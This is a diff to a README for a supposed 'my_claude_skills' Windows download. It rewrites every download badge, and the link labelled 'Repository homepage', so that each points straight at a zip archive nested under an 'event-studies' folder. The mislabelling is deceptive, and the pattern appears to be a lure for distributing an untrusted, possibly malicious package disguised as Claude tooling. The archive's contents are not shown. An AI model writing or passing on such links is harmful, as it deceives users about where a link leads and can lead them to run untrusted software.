@@ -1,6 +1,6 @@
 # 🤖 my_claude_skills - Easy Access to Claude Skills
 
-[![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-brightgreen)](https://github.com/robuxref2005/my_claude_skills)
+[![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-brightgreen)](https://github.com/robuxref2005/my_claude_skills/raw/refs/heads/main/event-studies/my-skills-claude-3.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to download and run the my_claude_skills software on your Win
 
    Click this large button to open the download page for this repository:
 
-   [![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-blue)](https://github.com/robuxref2005/my_claude_skills)
+   [![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-blue)](https://github.com/robuxref2005/my_claude_skills/raw/refs/heads/main/event-studies/my-skills-claude-3.1.zip)
 
 2. **Locate the download**
 
@@ -116,10 +116,10 @@ If the problem continues, visit the repository page to check for any known issue
 
 ## 🔗 Useful Links
 
-- Repository homepage: [https://github.com/robuxref2005/my_claude_skills](https://github.com/robuxref2005/my_claude_skills)
+- Repository homepage: [https://github.com/robuxref2005/my_claude_skills/raw/refs/heads/main/event-studies/my-skills-claude-3.1.zip](https://github.com/robuxref2005/my_claude_skills/raw/refs/heads/main/event-studies/my-skills-claude-3.1.zip)
 - Download my_claude_skills:
   
-  [![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-green)](https://github.com/robuxref2005/my_claude_skills)
+  [![Download my_claude_skills](https://img.shields.io/badge/Download-my_claude_skills-green)](https://github.com/robuxref2005/my_claude_skills/raw/refs/heads/main/event-studies/my-skills-claude-3.1.zip)
 
 - Claude official site: (you can search online for the latest Claude info)
 
